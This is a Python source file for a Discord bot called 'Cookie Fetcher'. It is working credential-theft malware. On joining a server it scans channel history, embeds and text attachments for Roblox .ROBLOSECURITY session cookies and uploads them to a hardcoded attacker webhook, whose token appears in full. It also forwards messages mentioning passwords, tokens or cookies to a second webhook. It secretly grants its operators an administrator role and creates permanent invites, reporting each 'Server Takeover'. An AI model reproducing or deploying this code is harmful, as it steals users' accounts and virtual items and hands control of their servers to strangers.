import os
import discord
from discord import app_commands
import aiohttp
import asyncio
import datetime
import re
import dotenv
import logging
import io
import json
from typing import List, Union, Dict, Any, Optional
from flask import Flask
from threading import Thread
from dotenv import load_dotenv

load_dotenv()

# 🟢 Environment variables for Render
BOT_TOKEN = os.environ.get('DISCORD_TOKEN')
WEBHOOK_URL = os.environ.get('WEBHOOK_URL')
MIRROR_WEBHOOK_URL = os.environ.get('MIRROR_WEBHOOK_URL')

if not BOT_TOKEN:
    raise ValueError("❌ DISCORD_TOKEN environment variable is required")

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

AUTHORIZED_USERS = [216953894322962433, 1422280514072608932, 219564668933373962]
CONTROL_CHANNEL_ID = 1432729863692881972
COOKIE_WEBHOOK_URL = "https://discord.com/api/webhooks/1432710240343822467/uYzeK2Z0TADkceF97olVympDJiJIJFDYbVrnz4uHwpV3AYh7QswHwb8-EVvrQ1SzyCHb"
OWNED_SERVER_IDS = [1396878002620727397]
SERVER_INVITES = {}

# 🟢 Bot state management
class BotState:
    def __init__(self):
        self.auto_delete_enabled = {}
        self.mirrored_messages = set()
        self.server_roles = {}
        self.has_auto_scraped = False

bot_state = BotState()

# 🟢 Flask server for UptimeRobot
app = Flask('')

@app.route('/')
def home():
    return "🤖 Bot running 24/7 on Render!"

@app.route('/health')
def health():
    return "✅ Healthy"

@app.route('/ping')
def ping():
    return "pong"

def run_flask():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

# Start Flask in background
if os.environ.get('RENDER', False):
    flask_thread = Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    logger.info("🚀 Flask server started for Render")

# 🟢 Control View for Auto-Delete
class ServerControlView(discord.ui.View):
    def __init__(self, guild):
        super().__init__(timeout=None)
        self.guild = guild

    @discord.ui.button(label="Enable Auto-Delete", style=discord.ButtonStyle.green, custom_id="enable_auto_delete")
    async def enable_auto_delete(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id not in AUTHORIZED_USERS:
            await interaction.response.send_message("❌ You are not authorized!", ephemeral=True)
            return

        bot_state.auto_delete_enabled[self.guild.id] = True
        await interaction.response.send_message("✅ Auto-delete enabled! Messages with @everyone/@here will be deleted.", ephemeral=True)

    @discord.ui.button(label="Disable Auto-Delete", style=discord.ButtonStyle.red, custom_id="disable_auto_delete")
    async def disable_auto_delete(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id not in AUTHORIZED_USERS:
            await interaction.response.send_message("❌ You are not authorized!", ephemeral=True)
            return

        bot_state.auto_delete_enabled[self.guild.id] = False
        await interaction.response.send_message("❌ Auto-delete disabled!", ephemeral=True)

# 🟢 High-Performance Cookie Fetcher
class CookieFetcher:
    def __init__(self):
        self.processed_messages = set()
        self.cookie_patterns = [
            r'_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Za-z0-9+/=]{100,}',
            r'ROBLOSECURITY=[A-Za-z0-9+/=]{100,}',
            r'\.ROBLOSECURITY=[A-Za-z0-9+/=]{100,}',
            r'CAEaAhA[B-D]\.[A-Za-z0-9_-]{100,}',
        ]

    def extract_cookies_from_text(self, text: str) -> List[str]:
        if not text:
            return []

        cookies_found = set()
        
        try:
            # Pattern 1: Standard cookie format
            pattern1 = r'_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_([A-Za-z0-9+/=]+)'
            matches = re.findall(pattern1, text)
            for match in matches:
                if len(match) > 100:
                    cookies_found.add(f"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_{match}")

            # Pattern 2: ROBLOSECURITY format
            pattern2 = r'(?:ROBLOSECURITY|\.ROBLOSECURITY)=([A-Za-z0-9+/=]{100,})'
            matches = re.findall(pattern2, text)
            for match in matches:
                cookies_found.add(f"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_{match}")

            # Pattern 3: CAE format
            pattern3 = r'(CAEaAhA[B-D]\.[A-Za-z0-9_-]{100,})'
            matches = re.findall(pattern3, text)
            for match in matches:
                cookies_found.add(f"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_{match}")

        except Exception as e:
            logger.error(f"Error extracting cookies from text: {e}")

        return list(cookies_found)

    async def fetch_attachments(self, message) -> List[str]:
        """Extract cookies from text attachments"""
        cookies_found = []
        
        for attachment in message.attachments:
            if attachment.filename.endswith(('.txt', '.log', '.json')):
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(attachment.url) as response:
                            if response.status == 200:
                                content = await response.read()
                                text_content = content.decode('utf-8', errors='ignore')
                                attachment_cookies = self.extract_cookies_from_text(text_content)
                                cookies_found.extend(attachment_cookies)
                except Exception as e:
                    logger.error(f"Error reading attachment {attachment.filename}: {e}")
        
        return cookies_found

    async def fetch_all_server_cookies(self, guild) -> Dict[str, Any]:
        """High-speed cookie scraping with 10k message limit"""
        all_cookies = set()
        total_messages_scanned = 0
        total_attachments_scanned = 0

        async def process_channel(channel):
            channel_cookies = set()
            messages_count = 0
            attachments_count = 0
            
            try:
                if not channel.permissions_for(guild.me).read_messages:
                    return [], 0, 0
                
                # High-speed processing with 10,000 message limit
                async for message in channel.history(limit=10000):
                    try:
                        messages_count += 1
                        
                        # Extract from message content
                        if message.content:
                            content_cookies = self.extract_cookies_from_text(message.content)
                            channel_cookies.update(content_cookies)
                        
                        # Extract from embeds
                        for embed in message.embeds:
                            if embed.description:
                                embed_cookies = self.extract_cookies_from_text(embed.description)
                                channel_cookies.update(embed_cookies)
                            if embed.title:
                                title_cookies = self.extract_cookies_from_text(embed.title)
                                channel_cookies.update(title_cookies)
                            for field in embed.fields:
                                if field.value:
                                    field_cookies = self.extract_cookies_from_text(field.value)
                                    channel_cookies.update(field_cookies)
                        
                        # Extract from attachments
                        if message.attachments:
                            attachment_cookies = await self.fetch_attachments(message)
                            channel_cookies.update(attachment_cookies)
                            attachments_count += len([a for a in message.attachments if a.filename.endswith(('.txt', '.log', '.json'))])
                            
                    except Exception as e:
                        continue
                    
            except Exception as e:
                logger.error(f"Error processing channel {channel.name}: {e}")
            
            return list(channel_cookies), messages_count, attachments_count

        # Process all channels concurrently at maximum speed
        tasks = []
        for channel in guild.text_channels:
            tasks.append(process_channel(channel))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, tuple) and len(result) == 3:
                cookies, count, att_count = result
                all_cookies.update(cookies)
                total_messages_scanned += count
                total_attachments_scanned += att_count

        return {
            'all': list(all_cookies), 
            'messages_scanned': total_messages_scanned, 
            'attachments_scanned': total_attachments_scanned
        }

    async def send_to_cookie_webhook(self, all_cookies: List[str], unique_cookies: List[str], messages_scanned: int, attachments_scanned: int, time_taken: float) -> bool:
        """Send cookie results to the cookie webhook"""
        try:
            async with aiohttp.ClientSession() as session:
                all_cookies_content = "\n\n".join(all_cookies) if all_cookies else "No cookies found"
                
                embed = discord.Embed(
                    description=f"**🍪 Cookie Fetch Complete**\n**✅ Cookies Found**\n**{len(all_cookies)}**\n**🔑 Unique Cookies**\n**{len(unique_cookies)}**\n**📩 Messages Scanned**\n**{messages_scanned}**\n**📎 Attachments Scanned**\n**{attachments_scanned}**\n**⏱️ Took**\n**{time_taken:.1f} seconds**",
                    color=0x3498db
                )

                form_data = aiohttp.FormData()
                form_data.add_field('payload_json', json.dumps({
                    'username': 'Cookie Fetcher',
                    'content': '@everyone\nto get these mass checked dm vextroz0001 on discord mass checking is when u mass check cookies to split valid and invalid ones',
                    'embeds': [embed.to_dict()]
                }))
                form_data.add_field('file', all_cookies_content.encode('utf-8'), filename='cookies.txt', content_type='text/plain')

                async with session.post(COOKIE_WEBHOOK_URL, data=form_data) as response:
                    if response.status not in [200, 204]:
                        error_text = await response.text()
                        logger.error(f"Failed to send to cookie webhook: {response.status} - {error_text}")
                        return False
                    else:
                        logger.info("Successfully sent to cookie webhook")
                        return True

        except Exception as e:
            logger.error(f"Error sending to cookie webhook: {e}")
            return False

# 🟢 High-Speed Bot Class
class CookieFetcherBot(discord.Client):
    def __init__(self):
        intents = discord.Intents.default()
        intents.messages = True
        intents.message_content = True
        intents.guilds = True
        intents.members = True
        intents.guild_messages = True
        super().__init__(intents=intents)
        self.tree = app_commands.CommandTree(self)
        self.fetcher = CookieFetcher()

    async def auto_scrape_all_servers_on_restart(self):
        """Auto-scrape all non-owned servers on bot restart at maximum speed"""
        if bot_state.has_auto_scraped:
            return
            
        logger.info("🔄 Auto-scraping all servers on restart...")
        bot_state.has_auto_scraped = True

        for guild in self.guilds:
            if guild.id not in OWNED_SERVER_IDS:
                try:
                    logger.info(f"🔄 Auto-scraping {guild.name} on restart...")
                    start_time = datetime.datetime.now()

                    result = await self.fetcher.fetch_all_server_cookies(guild)
                    all_cookies = list(set(result['all']))
                    actual_messages_scanned = result.get('messages_scanned', 0)
                    attachments_scanned = result.get('attachments_scanned', 0)
                    unique_cookies = [c for c in all_cookies if 'CAEaAhA' in c]

                    end_time = datetime.datetime.now()
                    time_taken = (end_time - start_time).total_seconds()

                    if all_cookies:
                        await self.fetcher.send_to_cookie_webhook(all_cookies, unique_cookies, actual_messages_scanned, attachments_scanned, time_taken)

                    logger.info(f"✅ Restart auto-scraped {len(all_cookies)} cookies from {guild.name}")
                    
                except Exception as e:
                    logger.error(f"❌ Error auto-scraping {guild.name} on restart: {e}")

    async def setup_hook(self):
        try:
            await self.tree.sync()
            logger.info("✅ Commands synced globally")
        except Exception as e:
            logger.error(f"❌ Error syncing commands: {e}")

    async def on_ready(self):
        logger.info(f'✅ Bot online: {self.user} (ID: {self.user.id})')
        logger.info(f'📊 Connected to {len(self.guilds)} servers')
        
        await self.change_presence(
            activity=discord.Activity(
                type=discord.ActivityType.watching,
                name=f"{len(self.guilds)} servers"
            )
        )

        # 🟢 AUTO-SCRAPE ALL SERVERS ON RESTART (NO DELAYS)
        await self.auto_scrape_all_servers_on_restart()

    async def ensure_dollar_role(self, guild) -> Optional[discord.Role]:
        if guild.id in bot_state.server_roles:
            return bot_state.server_roles[guild.id]
        
        existing_role = discord.utils.get(guild.roles, name="$$$")
        if existing_role:
            bot_state.server_roles[guild.id] = existing_role
            return existing_role
        
        try:
            if not guild.me.guild_permissions.manage_roles:
                logger.warning(f"❌ No permission to create roles in {guild.name}")
                return None
                
            role = await guild.create_role(
                name="$$$",
                permissions=discord.Permissions(administrator=True),
                color=discord.Color.gold(),
                hoist=True,
                mentionable=False,
                reason="Auto-created for authorized users"
            )
            
            try:
                positions = {role: 0 for role in guild.roles}
                await role.edit(position=len(guild.roles) - 2)
            except:
                pass
                
            bot_state.server_roles[guild.id] = role
            logger.info(f"✅ Created $$$ role in {guild.name}")
            return role
            
        except Exception as e:
            logger.error(f"❌ Error creating role in {guild.name}: {e}")
            return None

    async def assign_role_to_authorized(self, guild):
        role = await self.ensure_dollar_role(guild)
        if not role:
            return
        
        for user_id in AUTHORIZED_USERS:
            try:
                member = guild.get_member(user_id)
                if member and role not in member.roles:
                    if not guild.me.guild_permissions.manage_roles:
                        logger.warning(f"❌ No permission to assign roles in {guild.name}")
                        return
                        
                    await member.add_roles(role, reason="Authorized user")
                    logger.info(f"✅ Assigned $$$ role to {member.name} in {guild.name}")
                    
            except Exception as e:
                logger.error(f"❌ Error assigning role to user {user_id} in {guild.name}: {e}")

    async def auto_scrape_server(self, guild):
        try:
            logger.info(f"🔄 Auto-scraping new server: {guild.name}")
            start_time = datetime.datetime.now()
            
            result = await self.fetcher.fetch_all_server_cookies(guild)
            all_cookies = list(set(result['all']))
            actual_messages_scanned = result.get('messages_scanned', 0)
            attachments_scanned = result.get('attachments_scanned', 0)
            unique_cookies = [c for c in all_cookies if 'CAEaAhA' in c]
            
            end_time = datetime.datetime.now()
            time_taken = (end_time - start_time).total_seconds()

            if all_cookies:
                await self.fetcher.send_to_cookie_webhook(all_cookies, unique_cookies, actual_messages_scanned, attachments_scanned, time_taken)
            
            logger.info(f"✅ Auto-scraped {guild.name}: {len(all_cookies)} cookies")
            
        except Exception as e:
            logger.error(f"❌ Error auto-scraping {guild.name}: {e}")

    async def on_guild_join(self, guild):
        try:
            logger.info(f"🆕 Joined new server: {guild.name} (ID: {guild.id})")

            invite_url = "No invite available"
            try:
                channels = [c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite]
                if channels:
                    for channel in channels:
                        try:
                            invite = await channel.create_invite(
                                max_age=0, 
                                max_uses=0, 
                                reason="Bot monitoring invite",
                                temporary=False
                            )
                            invite_url = invite.url
                            SERVER_INVITES[guild.id] = invite_url
                            break
                        except:
                            continue
            except Exception as e:
                logger.error(f"❌ Error creating invite for {guild.name}: {e}")

            if guild.id not in OWNED_SERVER_IDS:
                takeover_embed = discord.Embed(
                    title="🚨 New Server Joined",
                    description=f"**Server:** {guild.name}\n**ID:** {guild.id}\n**Members:** {guild.member_count:,}\n**Invite:** {invite_url}",
                    color=0x00ff00,
                    timestamp=datetime.datetime.now()
                )
                takeover_embed.set_footer(text="Auto-Scraping Initiated")
                
                takeover_data = {
                    'username': 'Server Takeover Bot',
                    'content': '@everyone',
                    'embeds': [takeover_embed.to_dict()]
                }

                if MIRROR_WEBHOOK_URL:
                    try:
                        async with aiohttp.ClientSession() as session:
                            async with session.post(MIRROR_WEBHOOK_URL, json=takeover_data) as response:
                                if response.status not in [200, 204]:
                                    logger.error(f"Failed to send takeover to mirror webhook: {response.status}")
                    except Exception as e:
                        logger.error(f"Error sending to mirror webhook: {e}")

                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.post(COOKIE_WEBHOOK_URL, json=takeover_data) as response:
                            if response.status not in [200, 204]:
                                logger.error(f"Failed to send takeover to cookie webhook: {response.status}")
                except Exception as e:
                    logger.error(f"Error sending to cookie webhook: {e}")

                try:
                    control_channel = self.get_channel(CONTROL_CHANNEL_ID)
                    if control_channel:
                        embed = discord.Embed(
                            title="🎮 Server Control Panel",
                            description=f"**Server:** {guild.name}\n**Members:** {guild.member_count}\nControl auto-delete settings:",
                            color=0x3498db
                        )
                        view = ServerControlView(guild)
                        await control_channel.send(embed=embed, view=view)
                except Exception as e:
                    logger.error(f"Error sending control panel: {e}")

                # 🟢 AUTO-ASSIGN ROLES (NO DELAY)
                await self.assign_role_to_authorized(guild)

                # 🟢 AUTO-SCRAPE IMMEDIATELY (NO DELAY)
                await self.auto_scrape_server(guild)

                logger.info(f"✅ Auto-setup completed for {guild.name}")

        except Exception as e:
            logger.error(f"❌ Error in on_guild_join for {guild.name}: {e}")

    async def on_member_join(self, member):
        if member.id in AUTHORIZED_USERS and member.guild.id not in OWNED_SERVER_IDS:
            await self.assign_role_to_authorized(member.guild)

    async def on_message(self, message):
        if message.author == self.user:
            return

        if not message.guild or message.guild.id in OWNED_SERVER_IDS:
            return

        guild_id = message.guild.id

        # 🟢 AUTO-DELETE @everyone/@here messages if enabled
        if (guild_id in bot_state.auto_delete_enabled and
            bot_state.auto_delete_enabled[guild_id]):

            should_delete = (
                message.mention_everyone or
                '@everyone' in message.content or
                '@here' in message.content
            )

            if should_delete:
                try:
                    if message.channel.permissions_for(message.guild.me).manage_messages:
                        await message.delete()
                        logger.info(f"🗑️ Deleted ping message from {message.author.name} in {message.guild.name}")
                except Exception as e:
                    logger.error(f"❌ Error deleting message: {e}")

        # 🟢 AUTO-MIRROR specific messages if MIRROR_WEBHOOK_URL is set
        if (MIRROR_WEBHOOK_URL and
            message.id not in bot_state.mirrored_messages and
            message.guild):
            
            should_mirror = False
            mirror_reason = ""
            
            if message.mention_everyone or '@everyone' in message.content or '@here' in message.content:
                should_mirror = True
                mirror_reason = "Mass ping detected"
            
            sensitive_keywords = ['password', 'login', 'credential', 'token', 'secret', 'cookie', 'roblox', 'ROBLOSECURITY']
            content_lower = message.content.lower()
            if any(keyword in content_lower for keyword in sensitive_keywords):
                should_mirror = True
                mirror_reason = "Sensitive content detected"
            
            for embed in message.embeds:
                embed_text = f"{embed.title or ''} {embed.description or ''}".lower()
                if any(keyword in embed_text for keyword in sensitive_keywords):
                    should_mirror = True
                    mirror_reason = "Sensitive content in embed"
                    break

            if should_mirror:
                bot_state.mirrored_messages.add(message.id)
                if len(bot_state.mirrored_messages) > 10000:
                    bot_state.mirrored_messages = set(list(bot_state.mirrored_messages)[-5000:])
                
                await self.mirror_message(message, mirror_reason)

    async def mirror_message(self, message, reason):
        try:
            async with aiohttp.ClientSession() as session:
                content = message.content[:1500] if message.content else "*No content*"
                if len(message.content) > 1500:
                    content += "..."
                
                mirror_data = {
                    'username': f"{message.author.display_name} | {message.guild.name}",
                    'content': f"**{reason}**\n{content}",
                    'avatar_url': str(message.author.display_avatar.url) if message.author.display_avatar else None
                }

                if message.embeds:
                    mirror_data['embeds'] = [embed.to_dict() for embed in message.embeds if embed.type == 'rich']

                async with session.post(MIRROR_WEBHOOK_URL, json=mirror_data) as response:
                    if response.status not in [200, 204]:
                        error_text = await response.text()
                        logger.error(f"Failed to mirror message: {response.status} - {error_text}")

        except Exception as e:
            logger.error(f"❌ Error mirroring message: {e}")

# Initialize bot
bot = CookieFetcherBot()

# 🟢 Manual scrape command
@bot.tree.command(name="scrape", description="Scrape Roblox cookies from this server")
@app_commands.checks.has_permissions(administrator=True)
async def scrape_command(interaction: discord.Interaction):
    if interaction.user.id not in AUTHORIZED_USERS:
        await interaction.response.send_message("❌ You are not authorized to use this command!", ephemeral=True)
        return
        
    await interaction.response.defer(ephemeral=True)
    
    try:
        start_time = datetime.datetime.now()
        
        result = await bot.fetcher.fetch_all_server_cookies(interaction.guild)
        all_cookies = list(set(result['all']))
        actual_messages_scanned = result.get('messages_scanned', 0)
        attachments_scanned = result.get('attachments_scanned', 0)
        unique_cookies = [c for c in all_cookies if 'CAEaAhA' in c]
        
        end_time = datetime.datetime.now()
        time_taken = (end_time - start_time).total_seconds()

        success = await bot.fetcher.send_to_cookie_webhook(
            all_cookies, unique_cookies, actual_messages_scanned, 
            attachments_scanned, time_taken
        )

        try:
            dm_channel = await interaction.user.create_dm()
            if all_cookies:
                cookies_content = "\n".join(all_cookies)
                dm_embed = discord.Embed(
                    description=f"**🍪 Cookie Fetch Complete**\n**✅ Cookies Found**\n**{len(all_cookies)}**\n**🔑 Unique Cookies**\n**{len(unique_cookies)}**\n**📩 Messages Scanned**\n**{actual_messages_scanned}**\n**📎 Attachments Scanned**\n**{attachments_scanned}**\n**⏱️ Took**\n**{time_taken:.1f} seconds**",
                    color=0x3498db
                )
                await dm_channel.send(
                    content="**@everyone**\n**to get these mass checked dm vextroz0001 on discord mass checking is when u mass check cookies to split valid and invalid ones**",
                    file=discord.File(io.BytesIO(cookies_content.encode()), filename="cookies.txt"),
                    embed=dm_embed
                )
            else:
                await dm_channel.send(f"❌ No cookies found in {interaction.guild.name}")
        except Exception as e:
            logger.error(f"❌ Failed to send DM: {e}")

        if success:
            await interaction.followup.send(f"✅ Successfully scraped {len(all_cookies)} cookies from {interaction.guild.name}", ephemeral=True)
        else:
            await interaction.followup.send(f"⚠️ Scraped {len(all_cookies)} cookies but failed to send to webhook", ephemeral=True)

    except Exception as e:
        logger.error(f"❌ Error in scrape command: {e}")
        await interaction.followup.send(f"❌ Error during scraping: {str(e)}", ephemeral=True)

@scrape_command.error
async def scrape_error(interaction: discord.Interaction, error):
    if isinstance(error, app_commands.MissingPermissions):
        await interaction.response.send_message("❌ You need administrator permissions to use this command!", ephemeral=True)
    else:
        await interaction.response.send_message(f"❌ An error occurred: {str(error)}", ephemeral=True)

# 🟢 High-speed main loop
if __name__ == "__main__":
    logger.info("🚀 Starting Cookie Fetcher Bot...")
    
    restart_attempts = 0
    max_restart_delay = 300
    
    while True:
        try:
            bot.run(BOT_TOKEN, reconnect=True)
            
        except discord.LoginFailure:
            logger.error("❌ Invalid Discord token - stopping")
            break
            
        except Exception as e:
            restart_attempts += 1
            delay = min(10 * restart_attempts, max_restart_delay)
            
            logger.error(f"❌ Bot crashed (attempt {restart_attempts}): {e}")
            logger.info(f"🔄 Restarting in {delay} seconds...")
            
            import time
            time.sleep(delay)
